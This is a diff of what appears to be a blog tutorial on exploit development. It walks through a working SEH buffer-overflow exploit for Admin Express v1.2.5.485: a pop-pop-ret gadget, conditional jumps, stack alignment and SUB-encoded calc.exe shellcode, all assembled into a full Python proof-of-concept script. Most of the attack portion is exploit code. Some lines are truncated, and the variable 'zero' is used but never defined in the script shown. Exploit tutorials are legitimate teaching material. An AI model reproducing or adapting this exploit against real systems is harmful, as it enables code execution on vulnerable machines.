@@ -245,15 +245,16 @@ Before we align the stack, recall what was mentioned above about saving the curr
 root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
 # Proof of Concept - Admin Express v1.2.5.485 Exploit
 
-payload = "\x41" * 4260
-payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
-
 # We need to save the current stack pointer before execution of shellcode, due to
 # old stack pointer value needed when executing our payload of calc.exe. This puts the current stack pointer 0x0012DC98 into ECX, to be used later
 restore = "\x54" 			# push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
 restore += "\x59" 			# pop ecx; (holding the value of old ESP in ECX, to be called later.)
 restore += "\x51" 			# push ecx; (to get the value on the stack for the mov esp command later)
+
+# All togther now.
+payload = "\x41" * 4260
+payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
 
 # There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
 # so we have enough room for our shellcode and to decode.
@@ -406,15 +407,12 @@ After all of these instructions are executed, we can begin writing our shellcode
 root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
 # Proof of Concept - Admin Express v1.2.5.485 Exploit
 
-payload = "\x41" * 4260
-payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
 
 # We need to save the current stack pointer before execution of shellcode, due to
 # old stack pointer value needed when executing our payload of calc.exe. This puts the current stack pointer 0x0012DC98 into ECX, to be used later
-restore = "\x54" 			# push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
-restore += "\x59" 			# pop ecx; (holding the value of old ESP in ECX, to be called later.)
-restore += "\x51" 			# push ecx; (to get the value on the stack for the mov esp command later)
+restore = "\x54"                        # push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
+restore += "\x59"                       # pop ecx; (holding the value of old ESP in ECX, to be called later.)
+restore += "\x51"                       # push ecx; (to get the value on the stack for the mov esp command later)
 
 # Stack alignment
 # Need to make ESP 0x012F3F4. Using sub method to write that value onto the stack.
@@ -431,7 +429,12 @@ alignment += "\x2d\x38\x4d\x55\x55" # sub eax, 0x384D5555
 alignment += "\x2d\x36\x4d\x55\x55" # sub eax, 0x364D5555
 alignment += "\x2d\x36\x4e\x55\x55" # sub eax, 0x364E5555
 alignment += "\x50" # push eax
-alignment += "\x5c" # pop esp; (puts the value of eax back into esp)
+alignment += "\x5c" # pop esp; (puts the value of eax back into es
+
+# All together now.
+payload = "\x41" * 4260
+payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
 
 # There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
 # so we have enough room for our shellcode and to decode.
@@ -469,3 +472,189 @@ We already know what the first three instructions will do. After stepping throug
 Excellent! To get this value also into `ESP`, we execute our last two instructions of `push eax`, to get it on the stack, and `pop esp`, to pop the value into `ESP`! After execution, this is what our registers look like:
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/23.png" alt="">
+
+Perfect! Essentially now, we are in the driver's seat! What we can do now is we can manipulate `EAX` with whatever values we want, and they will write upwards in memory addresses, where `ESP` is pointing to! Remembering this, we should start with our last piece of shellcode.
+
+We are lucky here that our shellcode has four lines with four bytes each. If we had shellcode with 17 bytes, for instance, we would have to add some [NOPs](https://en.wikipedia.org/wiki/NOP_(code)). Here is what our shellcode looks like:
+
+```console
+"\x31\xc9\x51\x68"
+"\x63\x61\x6c\x63"
+"\x54\xB8\xc7\x93"
+"\xc2\x77\xff\xd0"
+```
+
+But what if our shellcode was this:
+
+```console
+"\x31\xc9\x51\x68"
+"\x63\x61\x6c\x63"
+"\x54\xB8\xc7\x93"
+"\xc2\x77\xff\xd0"
+"\x00"
+```
+
+We would have to add three NOPs, to fill out the four bytes needed in the register. But remember something here- NOPs are in our restricted character set! We can actually use `A`'s, `B`'s, or `C`'s to accomplish the same thing. Just remember that each of those three letters actuall incremement some of the general purpose registers. Don't forget that, if your shellcode is relying on some of those same registers to do some calculations!
+
+To get our shellcode on the stack, you would do the exact same method as above, but you would zero our the `EAX` register. We keep hearing me say "zero our the register". How exactly do we do this? Generally, you would use the logical [`XOR`](https://accu.org/index.php/journals/1915) function. If you `XOR` a register with itself, the value of the register turns to all `0`'s. You can achieve the same thing with logical [`AND`](https://processing.org/reference/logicalAND.html). Instead of using the register itself, you can use a string of `0`'s and `1`'s, and then perform another `AND` operation, with the inverse of those bits. This will be reflected in the updated PoC shortly. One other thing to note is that the opcode of `and eax` is `\x25`.
+
+Since we are writing to the stack towards upward addresses, you will need to start with the last line of shellcode for your payload (`calc.exe` in my case), and end with your first line. Here is a visual of what will be happening when we write to the stack:
+
+```console
+"\x31\xc9\x51\x68" - 1st line
+"\x63\x61\x6c\x63" - 2nd line
+"\x54\xB8\xc7\x93" - 3rd line
+"\xc2\x77\xff\xd0" - 4th line
+```
+
+After putting the 4th line on the stack:
+
+```console
+-
+-
+-
+4th line
+```
+
+After putting the 3rd line on the stack:
+
+```console
+-
+-
+3rd
+4th
+```
+
+After putting the 2nd line on the stack:
+
+```console
+-
+2nd
+3rd
+4th
+```
+
+After putting the 3rd line on the stack:
+
+```console
+1st
+2nd
+3rd
+4th
+```
+
+You can see how this is working now, and why we do it in this order. Since I already did an example of the subtraction method above, I am not going to redo it four more times. Here are some things to take note of though:
+1. When you have a value of `00` you need to do the sub method for, your three hex values to be added togther are `55 55 56`. This is because this is equal to 256, and because of [modular arithmetic](https://en.wikipedia.org/wiki/Modular_arithmetic).
+2. When you have a `00` value and you get an answer equal to 256 (which is 0), you have to carry a `1` down to the next line. So if you had these to values:
+
+```console 
+00
+30
+```
+
+You would do this:
+
+```console
+00 = 85(55) + 85(55) + 86(56)
+30 = 27(1B) + 1(01) + (01)
+```
+
+Notice how the last line only equals 29 instead of 30.
+
+3. The last thing to take note of, is sometimes the calculations just get mangled. I don't really have a good explanation for this one. Sometimes the numbers will be off by a few bytes, sometimes `1`'s do not get carried down to the next line when you reach a multiple of 256, etc. Just keep messing with the values if this happens, and you will figure it out!.
+
+Before I update the PoC, here are the assembler instructions for the opcodes we are going to execute for `calc.exe`:
+
+```console
+xor ecx,ecx        
+push ecx        
+push 0x636c6163 ; 0x636c6163 is calc    
+push dword ptr esp        
+mov eax,0x77c293c7        
+call eax  
+```
+
+Anyways, here is the updated PoC:
+
+```console
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
+
+
+# We need to save the current stack pointer before execution of shellcode, due to
+# old stack pointer value needed when executing our payload of calc.exe. This puts the current stack pointer 0x0012DC98 into ECX, to be used later
+restore = "\x54"                        # push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
+restore += "\x59"                       # pop ecx; (holding the value of old ESP in ECX, to be called later.)
+restore += "\x51"                       # push ecx; (to get the value on the stack for the mov esp command later)
+
+# Stack alignment
+# Need to make ESP 0x012F3F4. Using sub method to write that value onto the stack.
+# After making ESP 0x012F3F4, it should be the same value as EAX- so we can write up the stack.
+alignment = "\x54" # push esp
+alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
+
+# Write these 3 sub values in normal format, since memory address, not instruction to be executed. You do not have to do
+# it this way, but I do my calculations in normal format to remind me it is a memory address, when doing hex max. For my
+# other operations, I used little endian. If you do all of the calculations in one way, you do not need to flip the sub
+# math difference results. This is how I keep things straight
+# 384D5555 364D5555 364E5555
+alignment += "\x2d\x38\x4d\x55\x55" 	# sub eax, 0x384D5555
+alignment += "\x2d\x36\x4d\x55\x55" 	# sub eax, 0x364D5555
+alignment += "\x2d\x36\x4e\x55\x55"	# sub eax, 0x364E5555
+alignment += "\x50" 		   	# push eax
+alignment += "\x5c" 			# pop esp; (puts the value of eax back into es
+
+# calc.exe shellcode, via the sub method. Values needed are as followed. Reference the calc.exe shellcode line for line numbers.
+# 1st line = 2C552D14 01552D14 01562E16
+shellcode = zero
+shellcode += "\x2d\x14\x2d\x55\x2c" 	# sub eax, 0x2C552D14
+shellcode += "\x2d\x14\x2d\x55\x01" 	# sub eax, 0x01562D14
+shellcode += "\x2d\x16\x2e\x56\x01" 	# sub eax, 0x01562E16
+shellcode += "\x50" 		    	# push eax; (get the value on the stack). We will do this for all remaining steps like this one.
+
+# 2nd line = 24121729 24121739 2414194A
+shellcode += zero
+shellcode += "\x2d\x29\x17\x12\x24" 	# sub eax, 0x24121729
+shellcode += "\x2d\x39\x17\x12\x24"     # sub eax, 0x24121739
+shellcode += "\x2d\x4a\x19\x14\x24"     # sub eax, 0x2414194A (was 40 at the end, but a miscalc happened. Changed to 4A)
+shellcode += "\x50" 			# push eax
+
+# 3rd line = 34313635 34313434 34313434
+shellcode += zero
+shellcode += "\x2d\x35\x36\x31\x34" 	# sub eax, 0x34313635
+shellcode += "\x2d\x34\x34\x31\x34" 	# sub eax, 0x34313434
+shellcode += "\x2d\x34\x34\x31\x34" 	# sub eax, 0x34313434
+shellcode += "\x50" 			# push eax
+
+# 4th line = 323A1245 323A1245 333A1245
+shellcode += zero
+shellcode += "\x2d\x45\x12\x3a\x32" 	# sub eax, 0x323A1245
+shellcode += "\x2d\x45\x12\x3a\x32" 	# sub eax, 0x323A1245
+shellcode += "\x2d\x45\x12\x3a\x33" 	# sub eax, 0x333A1245
+shellcode += "\x50" 		    	# push eax
+
+# All together now.
+payload = "\x41" * 4260
+payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+
+# There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
+# so we have enough room for our shellcode and to decode.
+payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
+payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += restore
+payload += alignment
+payload += shellcode
+payload += "\x43" * (5000-len(payload))
+
+
+print payload
+
+#f = open('pwn.txt', 'w')
+#f.write(payload)
+#f.close()
+```
